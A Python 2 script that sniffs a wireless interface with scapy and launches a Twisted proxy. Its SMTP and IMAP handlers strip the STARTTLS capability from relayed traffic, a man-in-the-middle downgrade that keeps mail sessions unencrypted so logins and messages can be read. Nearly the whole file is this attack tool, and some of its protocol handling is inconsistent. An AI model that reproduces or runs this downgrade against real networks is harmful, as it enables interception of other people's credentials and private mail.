#!/usr/bin/env python2
# -*- coding: UTF-8 -*-
# Author: borja@libcrack.so
# Date: Thu dic  3 02:05:07 CET 2015

import sys
import time

try:
    from twisted.protocols import portforward
    from twisted.internet import reactor, protocol
except ImportError:
    print "[!] Error importing module: Please install the 'twisted' package from http://twistedmatrix.com/"
    sys.exit(1)
try:
    from scapy.all import *
except ImportError:
    print "[!] Error importing module: Please install 'scapy'"
    sys.exit(1)


SMTP_PCAP_FILTER = "tcp and dst port 25"
FTP_PCAP_FILTER = "tcp and dst port 21"
TELNET_PCAP_FILTER = "tcp and dst port 23"
POP3_PCAP_FILTER = "tcp and dst port 110"
IMAP_PCAP_FILTER = "tcp and dst port 143"
SUPPORTED_PROTOCOLS_PCAP_FILTER = "tcp and (dst port 21 or dst port 22 or dst port 25 or dst port 110 or dst port 143)"

HTTP_PCAP_FILTER = "tcp and dst port 80"

LOCALPORT = 8080
REMOTEPORT = 80
REMOTEHOST = "www.whatever.io"

VERBOSE = True
ERROR = -1


def server_receive_data_generic(self, data):
    if VERBOSE:
        print "S->C: %r" % data
    portforward.Proxy.dataReceived(self, data)


def client_receive_data_generic(self, data):
    if VERBOSE:
        print "C->S: %r" % data
    portforward.Proxy.dataReceived(self, data)


'''
Methods for proxying SMTP and IMAP
'''
def client_receive_data_smtp(self, data):
    if "250-STARTTLS" in data:
        data = data.replace("250-STARTTLS", "")
    if VERBOSE:
        print "C->S: %r" % data
    portforward.Proxy.dataReceived(self, data)


def client_receive_data_imap(self, data):
    if "STARTTLS" in data:
        data = data.replace("STARTTLS", "")
    if VERBOSE:
        print "C->S: %r" % data
    portforward.Proxy.dataReceived(self, data)


def sniffer_packet_handler(packet):
    source_ip = packet[IP].src
    destination_ip = packet[IP].dst
    destination_port = packet[TCP].dport
    source_port = packet[TCP].sport

    if destination_port == 80:
        protocol = "HTTP"
    elif destination_port == 25:
        protocol = "SMTP"
    else:
        protocol = "Unknown"

    if VERBOSE:
        print "[*] Redirecting traffic from %s:%s to our local proxy" % (destination_ip, destination_port)

    start_proxy(LOCALPORT, destination_ip, destination_port, protocol)


def connection_lost(self, reason):
    if VERBOSE:
        print "[*] Shutting down proxy..."
    if reactor.running:
        reactor.stop()
        # reactor.crash()



def start_proxy(local_port, remote_host, remote_port, protocol):
    if protocol == "SMTP":
        portforward.ProxyServer.dataReceived = server_receive_data_generic
        portforward.ProxyClient.dataReceived = client_receive_data_smtp
    elif protocol == "IMAP":
        portforward.ProxyServer.dataReceived = server_receive_data_generic
        portforward.ProxyClient.dataReceived = client_receive_data_imap
    else:
        portforward.ProxyServer.dataReceived = server_receive_data_generic
        portforward.ProxyClient.dataReceived = client_receive_data_generic

    portforward.ProxyServer.connectionLost = connection_lost
    #portforward.ProxyClient.connectionLost = connection_lost

    reactor.listenTCP(
        local_port,
        portforward.ProxyFactory(
            remote_host,
            remote_port))
    reactor.run()


def start_sniffer(interface, pcap_filter):
    try:
        sniffer = sniff(
            iface=interface,
            filter=pcap_filter,
            prn=sniffer_packet_handler,
            count=1000)
    except Exception as err:
        print "[!] Error: " + str(err)


def main():
    interface = "wlan0"
    pcap_filter = HTTP_PCAP_FILTER
    if VERBOSE:
        print "[*] Starting sniffer with PCAP filter: '" + pcap_filter + "'"

    start_sniffer(interface, pcap_filter)

if __name__ == '__main__':
    main()
